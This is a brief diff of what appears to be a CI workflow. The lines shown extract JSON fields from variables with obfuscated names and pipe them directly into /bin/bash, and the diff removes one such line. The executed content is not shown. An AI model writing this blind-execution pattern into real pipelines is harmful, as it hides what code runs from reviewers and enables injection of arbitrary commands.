@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$v467" | jq -r .d0 | /bin/bash
           printf '%s' "$nk41740" | jq -r .ckws21 | /bin/bash
-          echo $ukuv0345 | jq -r .yqnq7015 | /bin/bash
           echo $qllfa24 | jq -r .zkoy32 | /bin/bash
           echo $tdm96 | jq -r .clt670 | /bin/bash
           echo $hag6926 | jq -r .qyyvw1 | /bin/bash
